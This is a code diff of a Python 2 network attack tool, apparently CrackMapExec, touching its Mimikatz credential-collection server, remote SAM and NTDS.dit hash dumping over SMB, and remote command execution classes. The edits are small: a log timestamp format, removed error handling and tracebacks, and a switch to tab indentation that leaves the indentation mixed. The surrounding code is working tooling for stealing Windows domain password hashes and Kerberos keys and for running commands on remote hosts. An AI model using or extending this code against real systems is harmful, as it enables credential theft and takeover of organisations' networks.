@@ -269,7 +269,7 @@ class MimikatzServer(BaseHTTPRequestHandler):
         elif args.mimi_cmd:
             print data
 
-        log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
+        log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
         with open('logs/' + log_name, 'w') as creds:
             creds.write(data)
         print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
@@ -1647,44 +1647,36 @@ class DumpSecrets:
         return True
 
     def dump(self, smbconnection):
-        try:
-            self.__remoteOps = RemoteOperations(smbconnection)
-            self.__remoteOps.enableRegistry()
-            bootKey = self.__remoteOps.getBootKey()
+		self.__remoteOps = RemoteOperations(smbconnection)
+		self.__remoteOps.enableRegistry()
+		bootKey = self.__remoteOps.getBootKey()
 
-            # Let's check whether target system stores LM Hashes
-            self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
-            SECURITYFileName = self.__remoteOps.saveSECURITY()
+		# Let's check whether target system stores LM Hashes
+		self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
+		SECURITYFileName = self.__remoteOps.saveSECURITY()
 
-            if self.__sam is True:
-                SAMFileName = self.__remoteOps.saveSAM()
+		if self.__sam is True:
+			SAMFileName = self.__remoteOps.saveSAM()
 
-                self.__SAMHashes = SAMHashes(SAMFileName, bootKey)
-                self.dumped_sam_hashes = self.__SAMHashes.dump()
+			self.__SAMHashes = SAMHashes(SAMFileName, bootKey)
+			self.dumped_sam_hashes = self.__SAMHashes.dump()
 
-            elif self.__ntds is True:
-                if self.__useVSSMethod:
-                    NTDSFileName = self.__remoteOps.saveNTDS()
-                elif self.__useNinjaMethod:
-                    NTDSFileName = self.__remoteOps.saveNTDS(ninja=True)
-                    self.__useVSSMethod = True
-                else:
-                    NTDSFileName = None
+		elif self.__ntds is True:
+			if self.__useVSSMethod:
+				NTDSFileName = self.__remoteOps.saveNTDS()
+			elif self.__useNinjaMethod:
+				NTDSFileName = self.__remoteOps.saveNTDS(ninja=True)
+				self.__useVSSMethod = True
+			else:
+				NTDSFileName = None
 
-                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, noLMHash=self.__noLMHash, remoteOps=self.__remoteOps, useVSSMethod=self.__useVSSMethod)
-                try:
-                    self.dumped_ntds_hashes = self.__NTDSHashes.dump()
-                except Exception, e:
-                    logging.error(e)
-                    if self.__useVSSMethod is False:
-                        logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
-
-        except (Exception, KeyboardInterrupt) as e:
-            traceback.print_exc()
-            try:
-                self.cleanup()
-            except:
-                pass
+			self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, noLMHash=self.__noLMHash, remoteOps=self.__remoteOps, useVSSMethod=self.__useVSSMethod)
+			try:
+				self.dumped_ntds_hashes = self.__NTDSHashes.dump()
+			except Exception, e:
+				logging.error(e)
+				if self.__useVSSMethod is False:
+					logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
 
     def cleanup(self):
         logging.info('Cleaning up... ')
@@ -1896,7 +1888,6 @@ class TSCH_EXEC:
         try:
             self.doStuff(rpctransport)
         except SessionError as e:
-            if args.verbose: traceback.print_exc()
             if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
                 #If we receive the 'STATUS_OBJECT_NAME_NOT_FOUND' error, it might work if we try again
                 sleep(1)
@@ -2216,8 +2207,7 @@ class CMDEXEC:
                     result = self.shell.send_data(self.__command)
                     smb_server.stop()
 
-                else:
-                    if args.verbose: traceback.print_exc()
+                else:	
                     if hasattr(self, 'shell'):
                         self.shell.finish()
                     sys.stdout.flush()
@@ -3027,7 +3017,7 @@ def connect(host):
                 ntds_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, False, True, vss, ninja)
                 ntds_dump.dump(smb)
                 if ntds_dump.dumped_ntds_hashes:
-                    print_succ("{}:{} {} Dumping NTDS.dit secrets using the {} method (domain\uid:rid:lmhash:nthash):".format(host, args.port, s_name, args.ntds.upper()))
+                    print_succ("{}:{} {} Dumping NTDS.dit secrets using the {} method (domain\\uid:rid:lmhash:nthash):".format(host, args.port, s_name, args.ntds.upper()))
                     for h in ntds_dump.dumped_ntds_hashes['hashes']:
                         print_att(h)
                     print_succ("{}:{} {} Kerberos keys grabbed:".format(host, args.port, s_name))
@@ -3082,15 +3072,12 @@ def connect(host):
 
     except SessionError as e:
         print_error("{}:{} {}".format(host, args.port, e))
-        if args.verbose: traceback.print_exc()
 
     except NetBIOSError as e:
         print_error("{}:{} NetBIOS Error: {}".format(host, args.port, e))
-        if args.verbose: traceback.print_exc()
 
     except DCERPCException as e:
         print_error("{}:{} DCERPC Error: {}".format(host, args.port, e))
-        if args.verbose: traceback.print_exc()
 
     except socket.error as e:
         if args.verbose: print str(e)
